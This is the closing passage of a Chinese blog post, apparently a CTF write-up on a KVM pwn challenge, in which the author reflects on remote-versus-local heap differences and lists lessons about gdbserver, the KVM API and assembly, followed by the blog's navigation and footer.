<p>这个题目搭环境花了好长时间，本地打通以后打不通远程，用 gdbserver 调试了一下才发现 heap 环境不一样</p>
<p>学到了不少东西：</p>
<ul>
<li>gdbserver 调试 docker 中的环境</li>
<li>KVM api</li>
<li>一些汇编的知识</li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/KVM-pwn/" rel="tag"><i class="fa fa-tag"></i> KVM pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/" rel="prev" title="shellcode+socket本地进程通信">
      <i class="fa fa-chevron-left"></i> shellcode+socket本地进程通信
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="next" title="死亡之ping+ICMP栈溢出">
      死亡之ping+ICMP栈溢出 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">166</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">111</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">32:50</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
